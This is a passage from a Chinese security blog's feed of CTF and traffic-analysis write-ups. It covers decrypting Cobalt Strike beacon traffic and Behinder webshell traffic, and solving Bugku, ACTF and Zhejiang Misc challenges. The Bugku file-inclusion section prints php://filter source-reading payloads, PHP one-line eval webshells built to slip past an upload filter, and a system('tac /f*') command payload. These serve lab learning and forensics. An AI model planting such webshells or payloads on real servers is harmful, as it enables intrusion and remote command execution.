显示出主机之前，需要经过：被控机子的第一次心跳包；TeamServer 接收进入睡眠，并且解密数据包获取主机信息，生成新的 AES<br>\nkey 和 HMAC key 两个大致的步骤，接下来看看流量包</p>\n<p>过滤一下 http</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bscAdYSqGym9AHrC.png!thumbnail\" alt=\"\"></p>\n<p>可以看到一个心跳包一个回包，追踪一下看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WIzbHq6IgpHti5BR.png!thumbnail\" alt=\"\"></p>\n<p>可以看到 get 请求发送的第一个心跳包，cookie 记录了公钥加密后的主机信息和协商密钥，向 TeamServer 发包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UKMLncMKGZWU5gV1.png!thumbnail\" alt=\"\"></p>\n<p>可以看到 TeamServer 返回了一个空包，符合 TeamServer 第一次接收到心跳包的流程。</p>\n<p>对第一次心跳包抓包的发现做一个总结：根据前面所说，Teamserver 出现被上线机子的信息之前，需要经历第一次心跳包，而我们在此之前所拥有的行为只有点击 exe，也就是说双击 exe 的行为使我们向 TeamServer 进行了第一次的发包，并且让 TeamServer 成功解密获取到了主机信息并显示在了 TeamServer 上，成功上线</p>\n<h2 id=\"无回显指令\"><a class=\"markdownIt-Anchor\" href=\"#无回显指令\">#</a> 无回显指令</h2>\n<p>接下来分析一下第一个心跳包之后再次发送心跳包只无回显指令的情况，抓包，开始上线，将上线机子的 sleep 时间调整为 6-9s，静静等待几个睡眠时间</p>\n<p>过滤一下 http</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OTp6bWR4hkU1togE.png!thumbnail\" alt=\"\"></p>\n<p>发现睡眠时间调整后短时间内出现了很多心跳包的发送与回包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BEM8WX0ZyPC09c9b.png!thumbnail\" alt=\"\"></p>\n<p>根据上图所示，第一个框中就是上线前接收到的第一个心跳包，解析完之后进入睡眠，第二个框是第二次心跳包，回包发现 body 中带有指令信息，这就是我们修改 sleep 时间的指令，以回包的形式加密后发送给被控端，心跳包 1 和心跳包 2 之间间隔时间很长，因为原先设定的时间为默认的 60s，所以第一个心跳包之后进入的睡眠时间为 60s，结束之后第二个心跳包使被控端接收到指令修改 sleep 为 6s 之后，接下来抓包能明显感觉到心跳包发送的速度更快了。因为接下来没有进行任何的操作，因此第三个框中的回包全是空包</p>\n<h2 id=\"同一次睡眠时间执行1指令\"><a class=\"markdownIt-Anchor\" href=\"#同一次睡眠时间执行1指令\">#</a> 同一次睡眠时间执行 &gt; 1 指令</h2>\n<p>接着分析心跳包接收到有回显命令的情况。写到这里的时候，我有一个疑问，当 sleep 时间够长（可以为默认的 60s）时，执行两个指令，那么两个指令会作为一个心跳包的回包还是两个分别作为两个心跳包的回包呢？于是就想着把修改 sleep 时间的指令和一个命令行指令在第一次睡眠时间同时执行看看会是什么效果</p>\n<p>抓包过滤 http</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/30r8yh1Lbo0I2iys.png!thumbnail\" alt=\"\"></p>\n<p>同样分三个框来分析，在抓包过程中，在第一次睡眠时间修改了 sleep 并且输入了 ls 命令。第一个框便是第一次心跳包，第二个框便是 60s 睡眠时间过后的第二个心跳包，发现被控端 POST 传回了一个包，而这个包便是加密过后的命令执行的回显，根据上面<strong>无回显指令</strong>的分析，sleep 指令被传到被控端之后被执行是没有包被发送回来的，同时在抓取的过程中发现，第二个心跳包之后的心跳包发送间隔变短，也就是说两条指令被作为一个心跳包的回包发送给了被控端解密执行，sleep 指令没有发送回包，而命令执行的回显被 POST 传回 TeamServer，疑问成功解决。那么问题又来了，如果说有两条有回显的命令同一次睡眠时间执行，会不会在同一个包中 POST 发送回来呢？继续抓包研究</p>\n<p>这次在第一次心跳包之后的睡眠时间执行了 ls 和 shell more<br>\nflag.txt 两条指令，并空了两个心跳包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZnKaypioSb64HmWM.png!thumbnail\" alt=\"\"></p>\n<p>还是三个框来分析，第一个框为第一次心跳没问题，第三个框为空余的两次心跳包，第二个框可以确定的是心跳包的回包包含了两条指令，而我们可以明显的看到，只有一条 POST 请求包发送回 TeamServer 端，而我们的 TeamServer 端分别出现了两条命令的回显，证明两条命令被放在同一个包作为 body，被加密后 POST 发送回 TeamServer</p>\n<p>** 结论：** 在一个睡眠时间中同时执行两条指令，两条指令会在同一个心跳包询问时（也就是睡眠时间过后的下一个心跳包）被一起返回执行；同时，如果执行两条带有回显的命令，两次的回显也会被放在同一个包 POST 发回。也就是说一次心跳可以执行多条指令，并且同样可以返回多条指令的回显</p>\n<p>（PS：当然啦这是为了研究下流量所以一点点慢慢分析，如果好奇想知道能否一次心跳执行多条指令的直接 TeamServer 执行试试，看看回显和功能的改变就好）</p>\n<p>##</p>\n<h2 id=\"解密cs通信流量\"><a class=\"markdownIt-Anchor\" href=\"#解密cs通信流量\">#</a> 解密 CS 通信流量</h2>\n<h3 id=\"方法一\"><a class=\"markdownIt-Anchor\" href=\"#方法一\">#</a> 方法一：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NsemR1ZGUvY3Mtc2NyaXB0cw==\">https://github.com/Slzdude/cs-scripts</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dCR2xJbC9DU19EZWNyeXB0\">https://github.com/WBGlIl/CS_Decrypt</span></p>\n<p>根据 CS 的通信流程，我们可以知道最后的通信流量是通过生成的 AES Key 和 HMAC<br>\nKey 进行加密的，也就是说需要得到这两个 key。而这两个 key 是根据 TeamServer 端接收到第一个心跳包时用私钥去解密心跳包中公钥加密的 cookie，根据解密出的协商公钥生成的。而公钥加密的 cookie 我们自然能在心跳包中看到，私钥就需要去.cobaltstrike.beacon_keys 文件中拿，使用 github 上的 cs-scripts 项目能进行提取。这就具备了解密 CS 通信流量的条件了</p>\n<p>对于上一个标题所得的后半段结论：&quot;多条回显会被同一个包发送回来&quot; 的结论，如果没有看 TeamServer 只看流量包并不能确定。因此，既然知道了解密方法，那就拿上一标题中的流量包来进行解密说明</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vb1foefxNCQYSVlP.png!thumbnail\" alt=\"\"></p>\n<p>首先先拿到私钥，并使用 CS_Decrypt 项目中的脚本利用私钥解密心跳包中的 cookie</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EPkich9vmVFo3gFO.png!thumbnail\" alt=\"\"></p>\n<p>成功拿到被控主机信息和两个需要用到的 key</p>\n<p>接着就可以拿这两个 key 去解密通讯流量了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QtGGFfBQeYy8jYRi.png!thumbnail\" alt=\"\"></p>\n<p>首先是第二个心跳包的回包，也就是带有 TeamServer 指令的加密回包，它的 body 中带有指令，查看它的 data 数据，根据脚本要求将其进行 16 进制转换再转换为 base64 编码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MaFkCq1tZfMKz5bX.png!thumbnail\" alt=\"\"></p>\n<p>利用已知的两个 key 和加密的 base64 编码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Jh3Sp7iyGwwFz8qd.png!thumbnail\" alt=\"\"></p>\n<p>可以看到执行了 more<br>\nflag.txt 而没有看到 ls 命令，这是为什么呢？先继续往下看，看看命令执行的回显</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yGcYelH83tiNXRip.png!thumbnail\" alt=\"\"></p>\n<p>也就是被控机子 POST 发回 TeamServer 的包的 data 数据块，同样的方法放入解密脚本中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QqByEDHMFR5r8BMy.png!thumbnail\" alt=\"\"></p>\n<p>但是发现也是能解密出一条命令执行的回显，这就很奇怪了，按照上面三个框的分析，第一个框为第一次心跳包，没有操作，第三个框也同样是返回空包，能返回的只有第二个框中的 POST 请求包，并且在抓取流量的时候也确切的看到 TeamServer 端回显了第二个命令执行的内容，所以只可能是脚本的问题</p>\n<h3 id=\"方法二\"><a class=\"markdownIt-Anchor\" href=\"#方法二\">#</a> 方法二：</h3>\n<p>重新出发</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pbmhhbmd4aWFvaHVpL0NTdGhpbmc=\">https://github.com/minhangxiaohui/CSthing</span></p>\n<p>先说说该脚本，并且简单对比一下和方法一之间使用的不同</p>\n<p>首先能看到 1768.py 该脚本是用来解密信标的，信标中包含了很多 TeamServer 端的信息，包括公钥、sleep、抖动都能从信标中解密出来，也就是说，不一定要找到本地的 key 文件，同样可以通过解密信标，使用公钥进行指纹匹配来获取私钥（1768.py 中就已有现披露的 CSkey 的库），但是如果是未披露的 CSkey，那么拿到信标依然没有作用，还是得拿到本地的 key 文件才能解密流量。这里的私钥同样用方法一当中的脚本来获取</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/edP45N5pP2hM7f90.png!thumbnail\" alt=\"\"></p>\n<p>先将 key 进行 base64 解码之后再转为 16 进制</p>\n<p>使用命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 cs-decrypt-metadata.py -p 私钥 cookie</span><br></pre></td></tr></table></figure>\n<p>得到 Raw key、AES key 和 HMAC key</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ubm5wYy0xMzExNDQxMDQwLmNvcy5hcC1zaGFuZ2hhaS5teXFjbG91ZC5jb20vZWRQNDVONXBQMmhNN2Y5MC5wbmchdGh1bWJuYWls\">https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/edP45N5pP2hM7f90.png!thumbnail</span></p>\n<p>并解密出主机信息，和方法一之中的脚本不同的是，接下来解密通信流量可以使用原始 key 也就是 Raw<br>\nkey 进行解密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 cs-parse-http-traffic.py -r [Raw key] 1.pcapng</span><br></pre></td></tr></table></figure>\n<p>在不规定其它参数的情况下解密出流量包中的通信流量</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DQrt5JUsZGS9X846.png!thumbnail\" alt=\"\"></p>\n<p>在这个脚本中就很清楚能看到了，第一个框显示了数据包 318 作为第二个心跳包的回包，回了两条指令，对于 % comspec% 的解释就是</p>\n<blockquote>\n<p>不管命令行外壳是 cmd.exe 还是 command.exe，% comspec%<br>\n 会自动选择正确的一个<br>\n而数据包 328 中，同样装载了两条指令的回显，证明上面的猜测是正确的</p>\n</blockquote>\n<blockquote>\n<p>记录一个过滤规则：<br>\n引用自：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm52aXNvLmV1LzIwMjEvMTAvMjcvY29iYWx0LXN0cmlrZS11c2luZy1rbm93bi1wcml2YXRlLWtleXMtdG8tZGVjcnlwdC10cmFmZmljLXBhcnQtMi8=\">https://blog.nviso.eu/2021/10/27/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-2/</span><br>\n 由于数据已加密，我们需要提供原始密钥（选项 -r<br>\ncaeab4f452fe41182d504aa24966fbd0），并且由于数据包捕获包含除纯 Cobalt<br>\nStrike C2 流量之外的其他流量，因此最好提供显示过滤器（选项 -Y http 和<br>\n ip. addr == 192.254.79.71 并且 frame.number &gt;<br>\n6703），以便该工具可以忽略所有非 C2 流量的 HTTP 流量。</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vnhj88afAtiDw4z0.png!thumbnail\" alt=\"\"></p>\n<p>再次进行一个总结，同一个心跳包的回包可以带回多条指令，而被同一个回包带回的命令如有多个执行的回显，那也会在同一个包 POST 发送回去。如一次心跳有多个命令执行的回显，方法一的脚本只能解密每次心跳第一次命令执行的回显，方法二解密的通信流量更全</p>\n<h3 id=\"方法三\"><a class=\"markdownIt-Anchor\" href=\"#方法三\">#</a> 方法三：</h3>\n<p>利用动态信标的进程转储直接获得 AES key、HMAC key 以及 RAW<br>\nkey，不需要去破解私钥解密元数组了，当然这个条件肯定需求更多，接下进行说明</p>\n<h4 id=\"3x\"><a class=\"markdownIt-Anchor\" href=\"#3x\">#</a> 3.x</h4>\n<p>首先说明</p>\n<p>为什么能在动态信标的内存转储中直接提取出三个 key，这是适用于 CS3.x 版本的方法，当对动态信标进行内存转储后，文件中能找到未加密的元数组，并且是以 0x0000BEEF<br>\n 开头的字节序列。同时在进程的生命周期中越早获取进程转储，它就越有可能包含未加密的元数据。</p>\n<p>这里先将提取脚本放出来，就不继续看 3.x 了，用的比较少</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">进程转储</span><br><span class=\"line\">&gt;tasklist</span><br><span class=\"line\">&gt;procdump.exe -mp PID</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0RpZGllclN0ZXZlbnMvQmV0YS9ibG9iL21hc3Rlci9jcy1leHRyYWN0LWtleS5weQ==\">https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py</span><br>\n 利用脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 cs-extract-key.py 转储文件.dmp</span><br></pre></td></tr></table></figure>\n<p>可以获得 key</p>\n<h4 id=\"4x\"><a class=\"markdownIt-Anchor\" href=\"#4x\">#</a> 4.x</h4>\n<p>接下来具体讲解和演示一下 4.x。4.x 和 3.x 的区别就在于：4.x 基本不能从动态信标的进程转储文件中恢复未加密的元数组，也就是说直接对 4.x 版本 cs 的动态信标的进程转储文件是提取不出通信所需要的 key。4.x 有自己解密的方法：</p>\n<blockquote>\n<p>AES 和 HMAC<br>\n 密钥可以在可写进程内存中找到，但没有明确标识这些密钥的标头。它们只是<br>\n 16<br>\n 字节长的序列，没有任何可区分的特征。为了提取这些密钥，该方法包括执行一种字典攻击。在进程内存中找到的所有可能的<br>\n 16 字节长、非空序列将用于尝试解密一段加密的 C2<br>\n 通信。如果解密成功，则已找到有效密钥。<br>\n该解密方法除了需要动态信标的进程转储文件之外还需要加密数据</p>\n</blockquote>\n<p>首先先用上文提到的 cs-parse-http-traffic.py 脚本对抓取的流量包进行提取加密数据的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 cs-parse-http-traffic.py -k unknown 1015.pcapng</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZAwTPyXvUc1TN9b3.png!thumbnail\" alt=\"\"></p>\n<p>得到加密数据之后，再用动态信标的进程转储文件进行爆破解密，得到 key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./cs-extract-key.py -t 加密data 转储文件.dmp</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XCqoclNSFMhUwNjb.png!thumbnail\" alt=\"\"></p>\n<p>接下来就可以利用 RAWkey 使用 cs-parse-http-traffic.py 对通信流量进行解密了，不同的是这里使用的是 SHA256<br>\nRaw Key，参数为 - k</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./cs-parse-http-traffic.py -k [SHA256 Raw key] 1.pcapng</span><br></pre></td></tr></table></figure>\n<p>接下来总结一下方法三，该方法简单来说就是需要利用动态信标的进程内存转储文件，从里面提取出未加密的元数组。3.x 在进程的生命周期越早时越能直接转储到未加密的元数组并直接进行提取。而 4.x 不行，它无法检测到标识开头，但是不影响转储文件中拥有 key，因此，通过截取所有可能的<br>\n 16 字节长、非空序列去尝试解密加密 data，如果成功，则匹配到正确密钥</p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/bugku%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1-2/",
            "url": "https://nnnpc.github.io/2024/04/16/bugku%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1-2/",
            "title": "bugku文件包含1-2",
            "date_published": "2024-04-16T05:58:18.969Z",
            "content_html": "<h1 id=\"文件包含1\"><a class=\"markdownIt-Anchor\" href=\"#文件包含1\">#</a> 文件包含 1</h1>\n<p>开启场景看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2xtrNjZURdu0nw9U.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3hUP288G7pRwkGJW.png!thumbnail\" alt=\"\"></p>\n<p>发现有个 index.php，那么就构造 poc 去读取它</p>\n<p>poc1：</p>\n<p><strong>?file=php://filter/resource=index.php</strong></p>\n<p>poc2：</p>\n<p><strong>?file=php://filter/read=convert.base64-encode/resource=index.php</strong></p>\n<p>poc1 的话是直接读取 index.php 的内容，但是很多时候不会显示在页面上，因此我们就用 poc2 去进行 base64 编码然后显示在浏览器上</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kQnA2XzFenJaRKTb.png!thumbnail\" alt=\"\"></p>\n<p>复制下编码后解码得到 flag</p>\n<p><strong>flag{2df58e9eb2c56228c9b4b0045103451c}</strong></p>\n<h1 id=\"文件包含2\"><a class=\"markdownIt-Anchor\" href=\"#文件包含2\">#</a> <strong>文件包含 2</strong></h1>\n<p>打开环境<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/p3jSTgSDVI89ra0b.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>f12 查看到有个 upload.php 的注释</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EUOv9Wdq507hlajp.png!thumbnail\" alt=\"\"></p>\n<p>访问看看</p>\n<p>发现是个上传口</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V5yLEoTcLKxGuq6V.png!thumbnail\" alt=\"\"></p>\n<p>而且提示只能上传 jpg gif<br>\npng 格式的文件，那么就先 bp 抓包上传最普通的一句话木马试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PvLzBvLPtgZheMQA.png!thumbnail\" alt=\"\"></p>\n<p>发现上传成功，不知道对内容有没有进行过滤</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uLnZBJ21mgxIcYLE.png!thumbnail\" alt=\"\"></p>\n<p>根据路径去查看一下上传上去的一句话</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TfbaswhydZktHFZv.png!thumbnail\" alt=\"\"></p>\n<p>对比一下，很明显发现 <code>&lt;? php ?&gt;</code>  全被过滤了，那就试试别的一句话</p>\n<p>一：</p>\n<p><strong>&lt;?=eval($_POST[‘1’]);echo’a’;</strong></p>\n<p>二：</p>\n<p><strong> <code>&lt;script language=php&gt;</code> echo’a’;eval($_POST[‘pass’]); <code>&lt;/script&gt;</code> </strong></p>\n<p>一：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BQXQVONEfqqoU42p.png!thumbnail\" alt=\"\"></p>\n<p>同样上传成功，去访问下看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bA4Kaqbas5eAhbI8.png!thumbnail\" alt=\"\"></p>\n<p>显示 a，证明成功了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fH1jsA30OKasXXMu.png!thumbnail\" alt=\"\"></p>\n<p>可以 hackbar 进行命令执行获取 flag 也可以蚁剑连接 getshell</p>\n<p>二：</p>\n<p>使用了 script 标签</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rn9fIb0omCZlXO1e.png!thumbnail\" alt=\"\"></p>\n<p>同样上传成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yvzK4O3ElD7RegL4.png!thumbnail\" alt=\"\"></p>\n<p>同样输出 a</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8hx3yPpXbUo5X8bg.png!thumbnail\" alt=\"\"></p>\n<p>以二为例使用 hackbar 获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/p7IqyHJCWU1CxMBu.png!thumbnail\" alt=\"\"></p>\n<p>测试后门成功，接着利用语句</p>\n<p><strong>pass=system(“tac /f*”);phpinfo();</strong></p>\n<p>获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rRsBGl2FXPPYxNmI.png!thumbnail\" alt=\"\"></p>\n<p>以二为例利用蚁剑 getshell 获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/n8RKBNlu3UG6FhCz.png!thumbnail\" alt=\"\"></p>\n<p>在根目录下找到 flag</p>\n<p><strong>flag{51191745789e4c01bc43f0e3b157e281}</strong></p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/ACTF2023CTFer%20simulator/",
            "url": "https://nnnpc.github.io/2024/04/16/ACTF2023CTFer%20simulator/",
            "title": "ACTF2023CTFer simulator",
            "date_published": "2024-04-16T05:58:18.967Z",
            "content_html": "<p>访问 service 并抓包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/84TvBuenmgMbykRk.png!thumbnail\" alt=\"\"></p>\n<p>一直放包直到看到 events.yaml，发送到重发器</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vmIq35Cni0YS2BD6.png!thumbnail\" alt=\"\"></p>\n<p>得到 200 的状态码时拦截回包，这时候就可以进行修改配置文件的操作了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/l7GflpSldtVqqIsw.png!thumbnail\" alt=\"\"></p>\n<p>全局搜索，将 100 的 energy 全改成 10000 放包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IcIRL9m3Bz000BJk.png!thumbnail\" alt=\"\"></p>\n<p>修改成功后就可以玩游戏操作了，游戏有几个注意点</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.时间只有两天，第三天9:00时必须拿到8个flag</span><br><span class=\"line\">2.第一天会有考试，需要复习通过考试</span><br><span class=\"line\">3.失败了不要死磕，换种方法</span><br></pre></td></tr></table></figure>\n<p>当然也有小 tips：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.可以在考试前两个小时开始复习（一定的pass机率不过成功率蛮高）</span><br><span class=\"line\">2.在打exp时最后还有inside在手上（越到后面inside越难拿）</span><br><span class=\"line\">3.wrong flag尽量改对</span><br></pre></td></tr></table></figure>\n<p>在第三天 9:00 之前拿到至少 8 个 flag 之后进行抓包，当跳转回重新开始的页面时会有一次交互，截取数据包之后发送就能看到 flag 了<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/71vcXZHYuNSJUji0.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E5%86%B3%E8%B5%9B%20Misc/",
            "url": "https://nnnpc.github.io/2024/04/16/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E5%86%B3%E8%B5%9B%20Misc/",
            "title": "2023浙江省决赛 Misc",
            "date_published": "2024-04-16T05:58:18.965Z",
            "content_html": "<h2 id=\"xcode-v58\"><a class=\"markdownIt-Anchor\" href=\"#xcode-v58\">#</a> Xcode v5.8</h2>\n<p>文本中得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hAXBCEaBZMLZNJbRAQnNlOZdARqFAB1QpKa7IF4F5R1ElBKErIKpFQZNcNEc+</span><br></pre></td></tr></table></figure>\n<p>看编码的构造结构和题目提示 xcode，猜测为 xxencode 编码，随波逐流解码得</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">23NBceayYVwLs6qjZLwdL475ZbTDdGt415d7QmQrVhe</span><br></pre></td></tr></table></figure>\n<p>v5.8 提示为 base58，解码得到 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pjZlZCP5TAtle33t.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>DASCTF{The_new_encode_master!!}</strong></p>\n<h2 id=\"ez_signin\"><a class=\"markdownIt-Anchor\" href=\"#ez_signin\">#</a> Ez_Signin</h2>\n<p>解压附件得到加密压缩包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rBwWTSMPc5dCKL9p.png!thumbnail\" alt=\"\"></p>\n<p>ARCHPR 爆破</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LkvAfs8d27Tpd6eM.png!thumbnail\" alt=\"\"></p>\n<p>得到密码：11452</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v1NmdtZhyyA4wngv.png!thumbnail\" alt=\"\"></p>\n<p>将文本中的内容进行 base32 解码得到按键精灵的脚本</p>\n<p>将脚本复制到按键精灵的源文件界面</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/p8IHxudYgVzn97Cx.png!thumbnail\" alt=\"\"></p>\n<p>F10 运行发现鼠标画出了 flag 字样，于是打开画板运行得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xzg0EQLOAEOvQcQD.png!thumbnail\" alt=\"\"></p>\n<p>如果将脚本运行到最后能发现 flag 是被删除了一部分的，在这个花括号 F12 停止即可</p>\n<p><strong>flag{8f16a9717824aa456eb9a98653eb3993}</strong></p>\n<h2 id=\"newgrating\"><a class=\"markdownIt-Anchor\" href=\"#newgrating\">#</a> NewGrating</h2>\n<p>这题在比赛中并没出，有点小遗憾，赛后把最后的光栅图了解了一下，记录一下</p>\n<p>解压得到流量包，总共七个流，不算多，一个个翻翻看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QnTgpdQxcyrhLlWu.png!thumbnail\" alt=\"\"></p>\n<p>在 0 流得到了冰蝎的马，同样得到了冰蝎的 key，e46023a69f8db309，并且流量是冰蝎 3 的 CBC 模式的 AES 加密。默认 iv 为 0123456789abcdef</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vrUa99WOPsdt3oCB.png!thumbnail\" alt=\"\"></p>\n<p>随便拿流 2 的请求包试试，成功解密</p>\n<p>接下来解密发现流 2、3 都没有什么作用，看到关键的流 4，流量比较大，追踪 tcp 会有点卡，并且返回包会被自动解码，这里建议追踪 http 并且放入 vscode 进行复制解码</p>\n<p>比赛的时候发现自己写的 gui 跑不了这么大的数据，就只能手搓脚本了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span 